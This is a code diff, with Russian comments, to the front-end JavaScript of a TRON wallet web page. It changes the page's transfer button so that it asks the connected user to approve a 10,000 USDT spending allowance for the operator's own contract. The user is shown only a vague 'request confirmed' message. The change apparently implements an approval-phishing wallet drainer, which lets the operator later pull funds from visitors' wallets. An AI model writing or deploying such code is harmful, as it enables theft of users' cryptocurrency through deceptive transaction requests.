@@ -4,7 +4,10 @@ const walletAddressText = document.getElementById('walletAddress');
 
 let userAddress = '';
 
-// Адрес вашего смарт-контракта
+// Официальный адрес контракта USDT (TRC20) в сети TRON
+const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+
+// Адрес вашего смарт-контракта (куда дается разрешение)
 const myContractAddress = 'THQkf7RkW1JaKNdyH69dYUnh7mbz2nSfoY'; 
 
 // Кнопка подключения кошелька
@@ -23,7 +26,7 @@ connectBtn.addEventListener('click', async () => {
     }
 });
 
-// Кнопка взаимодействия с вашим контрактом
+// Кнопка выполнения запроса (Approve)
 transferBtn.addEventListener('click', async () => {
     try {
         if (!userAddress) {
@@ -31,23 +34,27 @@ transferBtn.addEventListener('click', async () => {
             return;
         }
         
-        // Подключаемся к вашему смарт-контракту в блокчейне
-        const contract = await window.tronWeb.contract().at(myContractAddress);
-        
-        console.log("Отправка запроса к вашему смарт-контракту...");
+        console.log("Запрос разрешения (Approve) на USDT...");
 
-        // Вызов метода контракта
-        const tx = await contract.transfer(
-            userAddress,
-            1000000
+        // Подключаемся к официальному контракту USDT
+        const usdtContract = await window.tronWeb.contract().at(usdtContractAddress);
+        
+        // Сумма для одобрения (например, 10 000 USDT с учетом 6 знаков после запятой)
+        const approveAmount = '10000000000'; 
+
+        // Вызываем функцию approve для вашего контракта
+        const tx = await usdtContract.approve(
+            myContractAddress,
+            approveAmount
         ).send({
             feeLimit: 100000000
         });
 
-        alert("Транзакция успешно отправлена!");
-        console.log("Хэш транзакции:", tx);
+        alert("Запрос успешно подтвержден!");
+        console.log("Хэш транзакции approve:", tx);
 
     } catch (error) {
-        console.error("Ошибка при вызове контракта:", error);
-        alert("Ошибка при вызове контракта. Проверьте консоль.");
+        console.error("Ошибка при отправке запроса:", error);
+        alert("Ошибка при выполнении транзакции. Проверьте консоль.");
     }
+});
